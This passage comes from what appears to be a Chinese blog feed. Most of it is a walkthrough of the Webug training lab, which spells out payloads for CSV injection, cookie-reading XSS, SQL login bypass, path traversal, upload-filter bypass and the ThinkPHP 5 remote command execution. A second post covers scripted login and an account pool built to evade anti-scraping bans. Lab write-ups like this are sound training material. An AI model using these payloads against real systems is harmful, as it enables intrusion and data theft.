class="line">&lt;&#x2F;tr&gt;</span><br><span class="line">&lt;&#x2F;table&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">&lt;input name&#x3D;&quot;submit&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;确认添加&quot;&#x2F;&gt;</span><br><span class="line"> &lt;&#x2F;form&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;..&#x2F;..&#x2F;..&#x2F;aa&#x2F;html&#x2F;table-to-excel.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        var tableToExcel &#x3D; new TableToExcel();</span><br><span class="line">        document.getElementById(&#39;button&#39;).onclick &#x3D; function () &#123;</span><br><span class="line">            tableToExcel.render(&quot;table&quot;);</span><br><span class="line">        &#125;;    </span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>php 版本修改为 5.4.45</p><p><img data-src="https://s2.loli.net/2022/02/22/qNAv2al7KBWx6k4.png"></p><p>打开靶场可以看到如下页面：</p><p><img data-src="https://s2.loli.net/2022/02/22/VM4Kpe5PLJlScDd.png"></p><p>漏洞利用：模拟攻击者添加一条信息，payload如 下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=<span class="number">1</span>+cmd|<span class="string">&#x27; /C calc&#x27;</span>!A0</span><br></pre></td></tr></table></figure><img data-src="https://s2.loli.net/2022/02/22/1BOhCiUwSQTAlxe.png" style="zoom: 80%;" /><p>当受害者导出 csv 文件后，不看提示盲目点是的话，就会中招，如下，打开了系统计算器：</p><img data-src="https://s2.loli.net/2022/02/22/js7cYDTmr45lQC8.png" style="zoom:80%;" /><p><a href="https://blog.csdn.net/weixin_41924764/article/details/108665746">CSV 注入原理和利用教程</a></p><h3 id="反射性-XSS"><a href="#反射性-XSS" class="headerlink" title="反射性  XSS"></a>反射性  XSS</h3><p>可以看到链接中的 <code>id=1</code>是可以利用的点</p><p><img data-src="https://s2.loli.net/2022/02/22/F5ZQuUrCAq6819H.png"></p><p><code>payload</code>如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p><img data-src="https://s2.loli.net/2022/02/22/viZMalnDA6WKo9e.png" alt="image-20220222162649742"></p><h3 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h3><p>可以看到页面最下面有个留言板</p><p><img data-src="C:\Users\Pro\AppData\Roaming\Typora\typora-user-images\image-20220222162843649.png"></p><p>经测试，输入上面的 payload 同样可以弹框获取 flag</p><h3 id="万能密码登录"><a href="#万能密码登录" class="headerlink" title="万能密码登录"></a>万能密码登录</h3><p>账号：<code>admin</code></p><p>密码：<code>&#39; or &#39;1&#39;=&#39;1</code></p><p><code>flag: htryyujryfhyjtrjn</code></p><h3 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a>DOM 型 XSS</h3><p>打开靶场，在输入框输入任意字符搜索</p><p><img data-src="https://s2.loli.net/2022/03/05/UvuzBWo4SDHg7Er.png"></p><p>查看页面元素可以发现输入的值在 value 中包含着，</p><p><img data-src="https://s2.loli.net/2022/03/05/2rTXnp9DLtBQfis.png"></p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick&#x3D;alert(document.cookie) id&#x3D;&quot;</span><br></pre></td></tr></table></figure><p>输入上述代码点击搜索会将其存储到数据库中，每次点击输入框便会弹出信息了</p><p><img data-src="https://s2.loli.net/2022/03/05/FNO73iQMHRI4w89.png"></p><h3 id="过滤-XSS"><a href="#过滤-XSS" class="headerlink" title="过滤 XSS"></a>过滤 XSS</h3><p>在地址栏填写代码，发现过滤了 script 字符</p><p><img data-src="https://s2.loli.net/2022/03/05/ZnszvUECNARH1Ox.png"></p><p>换个标签尝试</p><p><img data-src="https://s2.loli.net/2022/03/05/M6Q9utHxglXfEGh.png"></p><h3 id="链接注入"><a href="#链接注入" class="headerlink" title="链接注入"></a>链接注入</h3><p>“链接注入”是修改站点内容的行为，其方式为将外部站点的 URL 嵌入其中，或将有易受攻击的站点中的脚本 的 URL 嵌入其中。将 URL 嵌入易受攻击的站点中，攻击者便能够以它为平台来启动对其他站点的攻击，以及攻击这个易受攻击的站点本身。</p><p>在这些可能的攻击中，有些需要用户在攻击期间登录站点。攻击者从这一易受攻击的站点本身启动这些攻击，成功的机会比较大，因为用户登录的可能性更大。</p><p>“链接注入”漏洞是用户输入清理不充分的结果，清理结果会在稍后的站点响应中返回给用户。攻击者能够将危险字符注入响应中，便能够嵌入 URL 及其他可能的内容修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">?id&#x3D;&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;baidu.com&quot;&gt;baidu&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p><img data-src="https://s2.loli.net/2022/03/05/B6QYxtwKLiSVv3P.png"></p><p>点击会跳转到百度页面</p><h3 id="任意文件下载"><a href="#任意文件下载" class="headerlink" title="任意文件下载"></a>任意文件下载</h3><p>右键下载按钮复制链接</p><p><img data-src="https://s2.loli.net/2022/03/05/FkfQDVpnmshcxSL.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;control&#x2F;filedownload&#x2F;file_download.php?file&#x3D;template&#x2F;assets&#x2F;img&#x2F;1.txt</span><br><span class="line"># 修改链接</span><br><span class="line">&#x2F;control&#x2F;filedownload&#x2F;file_download.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;win.ini</span><br></pre></td></tr></table></figure><p><img data-src="https://s2.loli.net/2022/03/05/SVeqtTcnDGkhQPx.png"></p><h3 id="MySQL-配置文件下载"><a href="#MySQL-配置文件下载" class="headerlink" title="MySQL 配置文件下载"></a>MySQL 配置文件下载</h3><p>与上题类似，只不过要下载 MySQL 的配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;control&#x2F;filedownload&#x2F;ini_file_download.php?file&#x3D;..&#x2F;mysql&#x2F;my.ini</span><br></pre></td></tr></table></figure><p><img data-src="https://s2.loli.net/2022/03/05/y82lQPxKFpu4Ga9.png"></p><h3 id="文件上传（前端拦截）"><a href="#文件上传（前端拦截）" class="headerlink" title="文件上传（前端拦截）"></a>文件上传（前端拦截）</h3><p>查看页面源码，看到文件上传调用 js 函数为 type_filter，只允许上传图片文件</p><p><img data-src="https://s2.loli.net/2022/03/05/K1jF6cWqAg5by3x.png"></p><p>删除掉验证函数并保存网页到本地，再打开上传 php 文件</p><p><img data-src="https://s2.loli.net/2022/03/05/2IcpUszikO6uf9o.png"></p><p>访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;template&#x2F;upload&#x2F;phpinfo.php</span><br></pre></td></tr></table></figure><p><img data-src="https://s2.loli.net/2022/03/05/jYVbw3IFlA6sefM.png"></p><h3 id="文件上传（解析漏洞）"><a href="#文件上传（解析漏洞）" class="headerlink" title="文件上传（解析漏洞）"></a>文件上传（解析漏洞）</h3><p>文件名特殊字符绕过，将文件命名为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这里用了法语字符</span></span><br><span class="line">phpinfo1.phpç.jpg</span><br></pre></td></tr></table></figure><p><img data-src="https://s2.loli.net/2022/03/05/zrYvx29tPy3uGRX.png"></p><p>上传成功，如果无法上传更换 php 版本，一开始 5.4.45 无法解析字符，降低到 5.2.17 可以过</p><p><img data-src="https://s2.loli.net/2022/03/05/dKNDEoaU2kuMm3g.png"></p><h3 id="文件上传（畸形文件）"><a href="#文件上传（畸形文件）" class="headerlink" title="文件上传（畸形文件）"></a>文件上传（畸形文件）</h3><p>这里看了下服务端源码，过滤规则是将 php 替换为空</p><p><img data-src="https://s2.loli.net/2022/03/05/pc3kvtowsDPRTAB.png"></p><p>可以将文件名改为 <code>.pphphp</code> 即可绕过，可以看到，同时也要删除前端文件名验证函数保存成本地网页再运行。</p><p><img data-src="https://s2.loli.net/2022/03/05/pLcBHv15KCgrbXV.png"></p><h3 id="文件上传（截断上传）"><a href="#文件上传（截断上传）" class="headerlink" title="文件上传（截断上传）"></a>文件上传（截断上传）</h3><p>同解析漏洞文件上传，使用特殊字符文件名绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这里用了法语字符</span></span><br><span class="line">phpinfo1.phpç.jpg</span><br></pre></td></tr></table></figure><h3 id="文件上传（htaccess）"><a href="#文件上传（htaccess）" class="headerlink" title="文件上传（htaccess）"></a>文件上传（htaccess）</h3><p>靶场无法上传图片，需要先修改源文件，进入<code>C:\phpStudy\WWW\control\upload_file\upload_file_5.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">源：</span><br><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">修改成：</span><br><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br></pre></td></tr></table></figure><p><img data-src="https://s2.loli.net/2022/03/07/rkCp9sNVl632gBj.png"></p><p>php 版本要切换成 5.2.17</p><p><code>.htaccess</code>文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置.通过<code>htaccess</code>文件，可以实现:网页301重定向、自定义404页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能<br>通过<code>.htaccess</code>文件，我们可以让<code>php</code>的解析器解析一个文件名包含指定字符串的任意文件。</p><p>Windows 下文件必须有文件名，创建 <code>.htaccess</code>文件可以利用<code>cmd</code>，创建一个<code>1.txt</code>文件，再用<code>ren</code>命令修改：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 文件内容为 AddType application/x-httpd-php .jpg</span></span><br><span class="line"><span class="built_in">ren</span> <span class="number">1</span>.txt .htaccess</span><br></pre></td></tr></table></figure><p>先删除前端校验代码，上传名为 <code>.htaccess</code> 的文件，上传后抓包，在文件名后加一个特殊字符，因为后台把 htaccess 文件名加入了黑名单。</p><p><img data-src="https://s2.loli.net/2022/03/07/jnXcPNig9r5MJ3I.png"></p><p>接着上传一个 jpg 文件，内容改为<code>&lt;?php phpinfo();?&gt;</code>，本地修改或是抓包改都可，访问：</p><p><img data-src="https://s2.loli.net/2022/03/07/pVjb9yzM4LBvDJu.png"></p><p>成功通过 jpg 后缀文件访问到 php 代码信息</p><h3 id="越权修改密码"><a href="#越权修改密码" class="headerlink" title="越权修改密码"></a>越权修改密码</h3><p>创建用户，账号：aaaaa，密码：asdfsadf</p><p><img data-src="https://s2.loli.net/2022/03/12/l675tZGbMczSHYp.png"></p><p>进入系统后，有一个修改密码页面，输入对应信息</p><p><img data-src="https://s2.loli.net/2022/03/12/dmDJj4RnKBZeVoW.png"></p><p>提交抓包，修改 url 中 id 参数为  1（即 admin 账户）</p><p><img data-src="https://s2.loli.net/2022/03/12/5aMDwvrsO7WhkTu.png"></p><p>修改在再次登录 admin 账户，输入更改的密码即可登录</p><h3 id="支付漏洞"><a href="#支付漏洞" class="headerlink" title="支付漏洞"></a>支付漏洞</h3><p>打开网站，点击立即购买后，会弹框提示购买金额</p><p><img data-src="https://s2.loli.net/2022/03/12/1SczHjGWyPYlwsD.png"></p><p><img data-src="https://s2.loli.net/2022/03/12/nOMwjqe8DrlsRvB.png"></p><p>打开 Burpsuite 抓包，修改金额</p><p><img data-src="https://s2.loli.net/2022/03/12/zUYpBRn1Tfdjg9b.png"></p><p>然后提示只花费 1 元即购买了商品</p><p><img data-src="https://s2.loli.net/2022/03/12/N8t75PvFqEVZGci.png"></p><h3 id="邮箱轰炸"><a href="#邮箱轰炸" class="headerlink" title="邮箱轰炸"></a>邮箱轰炸</h3><p>输入邮箱进行注册，打开 Burpsuite 抓包</p><p><img data-src="https://s2.loli.net/2022/03/12/MC5TlFHB6cntDiE.png"></p><p>发送到 Intruder 模块，清除标记</p><p><img data-src="https://s2.loli.net/2022/03/12/KSWprxZ6yQw4AFk.png"></p><p>设置 payload 为 Null payload 发送 20 次，查看效果</p><h3 id="越权查看-admin"><a href="#越权查看-admin" class="headerlink" title="越权查看 admin"></a>越权查看 admin</h3><p>账号：aaaaa，密码：asdfsadf，登录后修改 id = 1 即可查看 admin 内容</p><p><img data-src="https://s2.loli.net/2022/03/12/rtPv5OhNCR6jp4G.png"></p><h3 id="URL-跳转"><a href="#URL-跳转" class="headerlink" title="URL 跳转"></a>URL 跳转</h3><p>触发页面跳转的地方，直接修改 URL，即可完成自定义跳转</p><h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><p>url 中暴露文件名</p><p><img data-src="https://s2.loli.net/2022/03/12/skJmB8w26uVfcqy.png"></p><p>尝试包含 win.ini</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/control/more/file_include.php?filename=../../../../../../../../../../../windows/win.ini</span><br></pre></td></tr></table></figure><p><img data-src="https://s2.loli.net/2022/03/12/FcO9UytWQpmHiPj.png"></p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>打开靶场有问题，切换 php 版本</p><p><img data-src="https://s2.loli.net/2022/03/12/mIs8udX3cD6o5tB.png"></p><p><img data-src="https://s2.loli.net/2022/03/12/nJKDC21Oex49kRY.png"></p><p>ThinkPHP v5 存在一个远程命令执行漏洞，影响的版本为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Thinkphp <span class="number">5.</span>x-Thinkphp <span class="number">5.1</span><span class="number">.31</span></span><br><span class="line">Thinkphp <span class="number">5.0</span>.x&lt;=<span class="number">5.0</span><span class="number">.23</span></span><br></pre></td></tr></table></figure><p>载入 payload：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/think\app/invokefunction&amp;<span class="function"><span class="keyword">function</span>=<span class="title">call_user_func_array</span>&amp;<span class="title">vars</span>[0]=<span class="title">system</span>&amp;<span class="title">vars</span>[1][]=<span class="title">whoami</span></span></span><br></pre></td></tr></table></figure><p><img data-src="https://s2.loli.net/2022/03/12/cdjikU7DPVYK2XF.png"></p><h3 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h3><p>一开始未弹框，更换 php 版本为 5.3.29-nts</p><p><img data-src="https://s2.loli.net/2022/03/12/aEWswqJ7YGvlZM8.png"></p><p>输入任意密码，使用 Burpsuite 抓包，标记密码后发送到 Intruder 模块，载入自定义的字典，开始攻击</p><p><img data-src="https://s2.loli.net/2022/03/12/clBfmxhiysg5wv9.png"></p><p>密码为 a1，登录 webshell</p><p><img data-src="C:\Users\Pro\AppData\Roaming\Typora\typora-user-images\image-20220312114611997.png"></p><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>打开靶场出现 Not Found</p><p><img data-src="https://s2.loli.net/2022/03/12/XtLQGqg1oBan5iH.png"></p><p>这里涉及到内外网端口和服务扫描，在 localhost 后加上 3306 端口即可</p><p><img data-src="https://s2.loli.net/2022/03/12/ITOJQdRaMVKiG7j.png"></p><p>主机敏感数据的读取</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:<span class="comment">///c:/windows/win.ini</span></span><br></pre></td></tr></table></figure><p><img data-src="https://s2.loli.net/2022/03/12/awx9WtdPUjs2fV6.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Webug &lt;/p&gt;</summary>
    
    
    
    <category term="Web 安全" scheme="https://speedpromise.github.io/categories/Web-%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="靶场测试" scheme="https://speedpromise.github.io/tags/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>爬虫笔记十 -- 模拟登录</title>
    <link href="https://speedpromise.github.io/archives/ad504db1.html"/>
    <id>https://speedpromise.github.io/archives/ad504db1.html</id>
    <published>2022-03-05T02:48:42.000Z</published>
    <updated>2022-03-10T13:14:25.492Z</updated>
    
    <content type="html"><![CDATA[<img data-src="https://s2.loli.net/2022/03/05/iplued3mBL6YUME.png" style="zoom: 67%;" /><p>很多情况下，网站的一些数据都需要登录才能查看，爬取过程中也需要实现模拟登录的机制，主要分为两种模式，一种是基于 Session 和 Cookie 的模拟登录，一种是基于 JWT(JSON Web Token) 的模拟登录。</p><span id="more"></span><h3 id="基于-Session-和-Cookie-的模拟登录"><a href="#基于-Session-和-Cookie-的模拟登录" class="headerlink" title="基于 Session 和 Cookie 的模拟登录"></a>基于 Session 和 Cookie 的模拟登录</h3><p>爬虫要做的事就是模拟浏览器进行登录，使用的方法有下面几种：</p><ul><li>浏览器中登录自己的账号，直接将 Cookie 复制给爬虫程序；</li><li>如果要让爬虫完全自动化操作，可以使用爬虫模拟登录发送 POST 请求，服务器返回的响应头中可能会有 Set-Cookie  ，只需保存这个字段内容即可，主要是要讲 Cookie 维持好。登录过程中会伴随着各种校验参数，不好直接模拟请求，客户端设置 Cookie 的过程是通过 JavaScript 实现的，还需要仔细分析其中的逻辑；</li><li>还可以使用 Selenium、Pyppeteer 或 Playwright 驱动浏览器实现模拟登录，登录成功后，再获取浏览器的 Cookie 并保存。</li></ul><p>下面使用一个<a href="https://login2.scrape.center/">案例网站</a>来进行模拟登录实战，账号密码均为 admin</p><p><img data-src="https://s2.loli.net/2022/03/10/MI7vQ9bXKY1trJe.png"></p><p>打开开发者工具进行登录操作，可以看到登录的 URL 是<code>https://login2.scrape.center/login</code>，返回的状态码是 302</p><p><img data-src="https://s2.loli.net/2022/03/10/dmOPD4bTVlWZQG3.png"></p><p>代码实现如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&#x27;https://login2.scrape.center/&#x27;</span></span><br><span class="line">LOGIN_URL = urljoin(BASE_URL, <span class="string">&#x27;login&#x27;</span>)</span><br><span class="line">INDEX_URL = urljoin(BASE_URL, <span class="string">&#x27;page/1&#x27;</span>)</span><br><span class="line">USERNAME = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">PASSWORD = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line">response_login = session.post(LOGIN_URL, data=&#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: USERNAME,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: PASSWORD</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">cookies = session.cookies</span><br><span class="line">print(<span class="string">&#x27;Cookies&#x27;</span>, cookies)</span><br><span class="line"></span><br><span class="line">response_index = session.get(INDEX_URL, cookies=cookies)</span><br><span class="line">print(<span class="string">&#x27;Response Status&#x27;</span>, response_index.status_code)</span><br><span class="line">print(<span class="string">&#x27;Response URL&#x27;</span>, response_index.url)</span><br><span class="line"></span><br><span class="line">------------- result -------------</span><br><span class="line">Cookies &lt;RequestsCookieJar[&lt;Cookie sessionid=0qf3j6g6ll2cy0x7ky0no3rrkgtwuf1m <span class="keyword">for</span> login2.scrape.center/&gt;]&gt;</span><br><span class="line">Response Status <span class="number">200</span></span><br><span class="line">Response URL https://login2.scrape.center/page/<span class="number">1</span></span><br></pre></td></tr></table></figure><p>最后打印的页面 URL 是 INDEX_URL，模拟登录成功。</p><h3 id="基于-JWT-模拟登录"><a href="#基于-JWT-模拟登录" class="headerlink" title="基于 JWT 模拟登录"></a>基于 JWT 模拟登录</h3><p>基于 JWT 的模拟登录思路也简单，使用用户名和密码信息请求登录接口，在服务器返回结果中保存包含的 JWT 信息，之后发给服务器的请求均携带 JWT，如果 JWT 过期则需要重新获取，当然模拟过程肯定会携带一些加密参数，需要实际情况具体分析。</p><p>与上节实战操作类似，本节也用一个<a href="https://login3.scrape.center/">案例网站</a>来进行模拟登录实战，通过开发者工具可以看到返回的 token：</p><p><img data-src="https://s2.loli.net/2022/03/10/lzY91bJkdUnZV5S.png"></p><p>后续的资源请求也都带上了 Authorization 字段，内容为 jwt 加上 token 字段内容：</p><p><img data-src="https://s2.loli.net/2022/03/10/7Hu5yvXF2OT9UeZ.png"></p><p>实现代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> wsgiref <span class="keyword">import</span> headers</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&#x27;https://login3.scrape.center/&#x27;</span></span><br><span class="line">LOGIN_URL = urljoin(BASE_URL, <span class="string">&#x27;api/login&#x27;</span>)</span><br><span class="line">INDEX_URL = urljoin(BASE_URL, <span class="string">&#x27;api/book&#x27;</span>)</span><br><span class="line">USERNAME = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">PASSWORD = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line">response_login = session.post(LOGIN_URL, json=&#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: USERNAME,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: PASSWORD</span><br><span class="line">&#125;)</span><br><span class="line">data = response_login.json()</span><br><span class="line">print(<span class="string">&#x27;Response JSON&#x27;</span>, data)</span><br><span class="line">jwt = data.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">print(<span class="string">&#x27;JWT&#x27;</span>, jwt)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">f&#x27;jwt <span class="subst">&#123;jwt&#125;</span>&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response_index = session.get(INDEX_URL, params=&#123;</span><br><span class="line">    <span class="string">&#x27;limit&#x27;</span>: <span class="number">18</span>,</span><br><span class="line">    <span class="string">&#x27;offset&#x27;</span>: <span class="number">0</span></span><br><span class="line">&#125;, headers=headers)</span><br><span class="line">print(<span class="string">&#x27;Response Status&#x27;</span>, response_index.status_code)</span><br><span class="line">print(<span class="string">&#x27;Response URL&#x27;</span>, response_index.url)</span><br><span class="line">print(<span class="string">&#x27;Response Data&#x27;</span>, response_index.json())</span><br><span class="line"></span><br><span class="line">------------- result -------------</span><br><span class="line">Response JSON &#123;<span class="string">&#x27;token&#x27;</span>: <span class="string">&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjQ2OTU4NjI3LCJlbWFpbCI6ImFkbWluQGFkbWluLmNvbSIsIm9yaWdfaWF0IjoxNjQ2OTE1NDI3fQ.epD5A7BvD6vxzfgtWfWzKWIKC_mziIEr5HyBd1zhUFQ&#x27;</span>&#125;</span><br><span class="line">JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjQ2OTU4NjI3LCJlbWFpbCI6ImFkbWluQGFkbWluLmNvbSIsIm9yaWdfaWF0IjoxNjQ2OTE1NDI3fQ.epD5A7BvD6vxzfgtWfWzKWIKC_mziIEr5HyBd1zhUFQ</span><br><span class="line">Response Status <span class="number">200</span></span><br><span class="line">Response URL https://login3.scrape.center/api/book/?limit=18&amp;offset=0</span><br><span class="line">Response Data &#123;<span class="string">&#x27;count&#x27;</span>: <span class="number">9200</span>, <span class="string">&#x27;results&#x27;</span>: [&#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;34473697&#x27;</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;R数据科学实</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure><h3 id="账号池的搭建"><a href="#账号池的搭建" class="headerlink" title="账号池的搭建"></a>账号池的搭建</h3><p>如果爬虫爬取的数据量比较大或爬取速度较快，网站又有单账号并发限制或访问状态检测等反爬手段，这时便需要建立一个账号池，用多个账号随机访问网站或爬取数据，这样能大幅提高爬虫的并发量，降低被封号风险。例如准备 100 个账号，都模拟登录后保存对应的 Cookie 或 JWT，每次都随机选取一个来访问，账号多，每个账号被选取的概率就小，从而避免单账号并发量大的问题。</p><p>本节<a href="https://antispider6.scrape.center/">案例网站</a>，测试发现多次在登录状态下刷新页面会返回<code>403 Forbidden</code>，表明账号被封，需过段时间才能解封</p><p><img data-src="https://s2.loli.net/2022/03/10/yfdP4FgSNWaLvrs.png"></p><p>搭建方式和代理池类似</p><p>存储模块存储账号信息和 Cookie 信息，账号由用户名和密码组成；获取模块负责从存储模块中拿取账号信息并模拟登录，然后将登录成功后生产的 Cookie 保存到存储模块中；检测模块负责检测失效 Cookie；接口模块负责提供随机 Cookie；调度模块负责驱动其他模块运行。</p>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;https://s2.loli.net/2022/03/05/iplued3mBL6YUME.png&quot; style=&quot;zoom: 67%;&quot; /&gt;

&lt;p&gt;很多情况下，网站的一些数据都需要登录才能查看，爬取过程中也需要实现模拟登录的机制，主要分为两种模式，一种是基于 Session 和 Cookie 的模拟登录，一种是基于 JWT(JSON Web Token) 的模拟登录。&lt;/p&gt;</summary>
    
    
    
    <category term="Python" scheme="https://speedpromise.github.io/categories/Python/"/>
    
    
    <category term="爬虫笔记" scheme="https://speedpromise.github.io/tags/%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>爬虫笔记九 -- 代理池的搭建及实战应用</title>
    <link href="https://speedpromise.github.io/archives/a900817c.html"/>
    <id>https://speedpromise.github.io/archives/a900817c.html</id>
    <published>2022-03-02T03:38:43.000Z</published>
    <updated>2022-03-05T02:45:33.143Z</updated>
    
